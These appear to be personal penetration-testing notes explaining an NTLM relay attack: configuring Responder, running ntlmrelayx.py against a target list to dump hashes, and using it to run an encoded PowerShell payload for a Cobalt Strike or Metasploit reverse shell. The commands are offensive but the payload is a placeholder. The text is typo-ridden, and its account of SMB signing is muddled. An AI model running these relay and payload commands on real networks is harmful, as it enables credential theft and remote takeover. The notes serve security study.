# NTLM Relay Attack

Instead of cracking hashes gathered with Responder, we can instead relay those hashes to specific machines and potential gain access.

Requirements:

SMB singing is disabled or not required, the singing checks for MAC address and password and if it doesnt we can just run that hash and login.

Relayed user credentials must be admin on machine.

SETUP

1\. Run respoder

2\. getdit Responder.conf

3\. take SMB = OFF type OFF

4\. take HTTP = OFF type OFF

5\. Reboot

This means that the responder doesn't relay, another tool will be used for that.

6\. set up the relay

7\. python ntlmrelayx.py -tf targets.txt -smb2support

So basically takes the relay takes the relay and passes on to another file.

This dumps all users , and other hashes.

Summary

We relay the hash to another machine and then we can dump the hashes as long as user that we are relaying from is an admin.

8\. python ntlmrelayx.py -tf targets.txt -smb2support -c 'powershell - hiden bla h balh -enc base64 encoded payload" we can do this with cobalt strike via the web scripted delivery while having a llistener and gain a shell or we could potentially use this with http delivery exploit on metasploit to get a reverse shell.&#x20;

![](../../../.gitbook/assets/2022-10-13\_11-18.png)
